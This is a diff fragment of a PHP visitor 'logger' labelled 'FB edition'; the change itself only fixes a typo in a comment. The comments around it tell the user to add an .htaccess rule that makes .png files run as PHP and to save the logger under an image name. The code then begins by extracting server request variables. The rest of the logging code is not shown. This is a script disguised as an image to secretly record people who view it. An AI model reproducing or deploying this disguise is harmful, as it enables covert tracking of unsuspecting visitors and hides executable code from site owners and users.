@@ -3,7 +3,7 @@
 //gnu license 2.0
 //FB edition
 //--IMPORTANT-- put this in .htmlaccess without quotation marks " AddType application/x-httpd-php .png "
-//replace h were it says .png in the line added to the htmlaccess with whatever you  save this php file as.
+//replace  where it says .png in the line added to the htmlaccess with whatever you  save this php file as.
 // if you're keeping it as it is then save this logger file as .png on the server
 //special thanks to ozkar  
 extract($_SERVER);
